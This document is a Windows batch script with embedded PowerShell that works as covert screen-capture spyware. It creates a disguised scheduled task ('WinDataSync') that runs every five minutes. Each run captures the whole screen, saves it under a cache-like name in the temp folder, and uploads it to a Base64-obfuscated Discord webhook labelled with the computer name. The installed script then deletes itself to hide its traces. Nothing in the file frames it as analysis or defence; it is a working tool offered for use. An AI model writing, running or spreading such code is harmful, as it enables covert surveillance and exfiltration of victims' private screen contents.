@echo off
setlocal EnableExtensions

:: ================= CONFIG =================
set "VERBOSE=true"
:: Your Webhook (Base64 Encoded)
set "W_B64=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTQ2ODQ3OTcwNzY3NjczNS9MU0NEeUtlMHh4d1Nyb0h5OEJISS1nUXA0TmE3dlowRWJIeFk5MGhxSlZJSmxBLW1ud0JqR0U0eGJ0UkYtWG1tRjhzbA=="
set "IMG_DIR=%TEMP%"
set "IMG_NAME=scr_cache.jpg"
set "FULL_PATH=%IMG_DIR%\%IMG_NAME%"
set "TASK_NAME=WinDataSync"
set "PS_SCRIPT=%TEMP%\cap_logic.ps1"
:: ==========================================

if "%VERBOSE%"=="false" echo [*] Setting frequency to 5 minutes...

:: Check if task exists; if it does, delete it to update the schedule
schtasks /query /tn "%TASK_NAME%" >nul 2>&1
if %errorlevel% equ 0 (
    if "%VERBOSE%"=="true" echo [*] Updating existing task...
    schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
)

:: Create the task: /sc minute /mo 5 (Every 5 Minutes)
schtasks /create /tn "%TASK_NAME%" /tr "cmd.exe /c \"\"%~f0\" bg\"" /sc minute /mo 5 /rl limited /f >nul 2>&1

:: Extract and Run the PowerShell Logic
findstr /b "###" "%~f0" | findstr /v "###findstr" > "%PS_SCRIPT%"
powershell -NoProfile -Command "(Get-Content '%PS_SCRIPT%') -replace '###', '' | Set-Content '%PS_SCRIPT%'"
powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_SCRIPT%" -W64 "%W_B64%" -FilePath "%FULL_PATH%" -VerboseMode "%VERBOSE%"

:: Cleanup
if exist "%PS_SCRIPT%" del /f /q "%PS_SCRIPT%"
if exist "%FULL_PATH%" del /f /q "%FULL_PATH%"

:: Self-delete if not running in background mode
if "%~1" neq "bg" (
    if "%VERBOSE%"=="true" echo [*] Task installed. Self-destructing...
    timeout /t 2 >nul
    (goto) 2>nul & del "%~f0"
)
exit /b

###Param($W64, $FilePath, $VerboseMode)
###try {
###    $W = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($W64))
###    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
###    $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
###    $b = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
###    $g = [System.Drawing.Graphics]::FromImage($b)
###    $g.CopyFromScreen(0,0,0,0,$b.Size)
###    $b.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
###    $g.Dispose(); $b.Dispose()
###
###    if (Test-Path $FilePath) {
###        $K = [System.Guid]::NewGuid().ToString()
###        $H = @{ 'Content-Type' = "multipart/form-data; boundary=$K" }
###        $F = [System.IO.File]::ReadAllBytes($FilePath)
###        $MS = New-Object System.IO.MemoryStream
###        $SW = New-Object System.IO.StreamWriter($MS)
###        $SW.Write("--$K`r`nContent-Disposition: form-data; name=`"payload_json`"`r`n`r`n{`"content`":`"New Capture from $env:COMPUTERNAME`"}`r`n--$K`r`nContent-Disposition: form-data; name=`"file`"; filename=`"s.jpg`"`r`nContent-Type: image/jpeg`r`n`r`n")
###        $SW.Flush(); $MS.Write($F, 0, $F.Length)
###        $SW.Write("`r`n--$K--`r`n"); $SW.Flush()
###        Invoke-RestMethod -Uri $W -Method Post -Headers $H -Body $MS.ToArray() | Out-Null
###    }
###} catch { }
